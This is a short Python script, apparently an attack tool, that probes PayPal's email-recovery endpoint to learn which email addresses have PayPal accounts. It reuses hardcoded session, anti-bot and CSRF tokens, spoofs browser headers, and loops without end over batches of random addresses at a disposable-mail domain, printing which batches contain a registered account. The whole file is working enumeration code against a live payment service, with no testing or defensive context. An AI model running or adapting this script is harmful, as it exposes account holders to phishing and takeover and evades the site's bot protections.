import requests
#from finder import *
import time, string, random
s = requests.Session()

def random_code(length=3):
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

startHeaders = {
	"Host":"www.paypal.com",
	"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0",
	"Accept":"*/*",
	"Accept-Language":"en-US,en;q=0.5",
	"Accept-Encoding":"gzip, deflate, br, zstd",
	"X-Requested-With":"XMLHttpRequest",
	"Content-Type":"application/json",
	"Origin":"https://www.paypal.com",
	"Sec-GPC":"1",
	"Connection":"keep-alive",
	"Referer":"https://www.paypal.com/authflow/email-recovery/?contextId=&redirectUri=%252Fsignin",
	"Sec-Fetch-Dest":"empty",
	"Sec-Fetch-Mode":"cors",
	"Sec-Fetch-Site":"same-origin",
	"Priority":"u=0",
	"TE":"trailers",
	}

#r = s.get("https://www.paypal.com/")
#r = s.get("https://www.paypal.com/authflow/email-recovery/")
#print(r.cookies.get('nsid'))

s.cookies.clear()

s.cookies.set("datadome","TrV0YP7K20gig3Uj6wGnYoH2Brai5j_LnkoEZifdMpG8bm2fb~SCSHvbnE8YWC9FeXWhWRhsRmXgqf2Lep82rjLh9fUdAadax0KxQ5iJeKwF2WWaDhx0VFqlgJ34v2ku", domain=".paypal.com", path="/")

s.cookies.set("nsid",r"s%3ABfZZJu2oatleARvIhSLq76Bre7wF43-C.8iMm87nvvaQ7NqJuNNVGLqICC5tv7iiiCj5KzvgKwlE", domain=".paypal.com", path="/")

#html = r.text
csrf = "2HLQaLx0CobpQKwl8gUpQXVrhCGE8XUJW4v9o="
n = 0
while True:
	ems = [random_code()+"@mailnesia.com" for _ in range(3)]
	data = {"emails":[ems[0],ems[1],ems[2]],"_csrf":csrf,"isCheckoutFlow":"false"}

	response = s.post(url="https://www.paypal.com/authflow/email-recovery", json=data, headers=startHeaders)
	try:
		if response.status_code == 200:
			if response.json()["notFound"] == False:
				print(n,"found an email in this trio", ems)
			elif response.json()["notFound"] == True:
				print(n,"no email is attached to paypal in ", ems)
			n = n + 1
		else:
			print(response.text)
	except:
		print("json error")